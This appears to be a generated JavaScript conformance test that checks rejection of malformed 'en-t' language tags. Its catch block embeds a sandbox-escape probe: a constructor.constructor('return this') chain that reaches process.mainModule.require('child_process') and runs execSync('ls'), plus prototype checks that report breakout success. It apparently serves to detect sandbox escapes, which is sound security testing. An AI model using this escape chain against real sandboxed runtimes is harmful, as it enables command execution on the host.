try {
    const invalid = [
        'en-t',
        'en-t-a',
        'en-t-x',
        'en-t-0',
        'en-t-',
        'en-t-en-',
        'en-t-0x-',
        'en-t-root',
        'en-t-abcdefghi',
        'en-t-ar-aao',
        'en-t-en-lat0',
        'en-t-en-latn-latn',
        'en-t-en-0',
        'en-t-en-00',
        'en-t-en-0x',
        'en-t-en-x0',
        'en-t-en-latn-0',
        'en-t-en-latn-00',
        'en-t-en-latn-xyz',
        'en-t-en-abcdefghi',
        'en-t-en-latn-gb-ab',
        'en-t-en-latn-gb-abc',
        'en-t-en-latn-gb-abcd',
        'en-t-en-latn-gb-abcdefghi',
        'en-t-d0',
        'en-t-d0-m0',
        'en-t-d0-x-private'
    ];
    for (let tag of invalid) {
        assert.sameValue(isCanonicalizedStructurallyValidLanguageTag(tag), false, '"' + tag + '" isn\'t a structurally valid language tag.');
        assert.throws(RangeError, () => Intl.getCanonicalLocales(tag), `${ tag }`);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}